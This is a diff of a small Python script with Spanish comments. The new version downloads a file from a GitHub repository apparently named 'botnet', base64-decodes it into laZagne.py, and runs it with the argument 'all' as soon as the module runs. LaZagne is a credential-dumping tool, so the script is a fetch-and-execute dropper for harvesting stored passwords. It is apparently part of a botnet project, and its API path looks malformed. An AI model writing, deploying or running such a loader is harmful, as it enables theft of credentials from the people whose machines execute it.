@@ -1,17 +1,31 @@
 import subprocess
-import os
- 
+import requests
+import base64
+
+url = "https://api.github.com/repos/Pol-Ruiz/botnet/edit/main/laZagne.py"
+
+def downloadFile(url):
+    print('[!] Descargando ' + url)
+    sha = None
+    content = None
+    res = requests.get(url).json()
+    if 'sha' in res and 'content' in res:
+        sha = res['sha']
+        base64_bytes = base64.b64decode(res['content'])
+        content = base64_bytes.decode('utf-8')
+        with open('laZagne.py', 'w') as f:
+            f.write(content)
+    else:
+        print('[-] ' + res.get('message', 'Error desconocido'))
+    return sha, content
+
 def run():
- # URL del archivo raw en GitHub
- #~url = "https://raw.githubusercontent.com/AlessandroZ/LaZagne/blob/master/Linux/laZagne.py"
-url = "https://api.github.com/AlessandroZ/LaZagne/blob/master/Linux/laZagne.py"
- 
- # Descargar el archivo
- subprocess.run(["curl", "-O", url], check=True)
- 
- # Nombre del archivo descargado
- nombre_archivo = url.split("/")[-1]
- 
- # Ejecutar el archivo con el argumento "all"
- output = subprocess.run(["python3", nombre_archivo, "all"], check=True)
+    # Descargar el archivo
+    downloadFile(url)
+    
+    # Ejecutar el archivo con el argumento "all"
+    output = subprocess.run(["python3", 'laZagne.py', "all"], check=True)
+
+run()
+
 
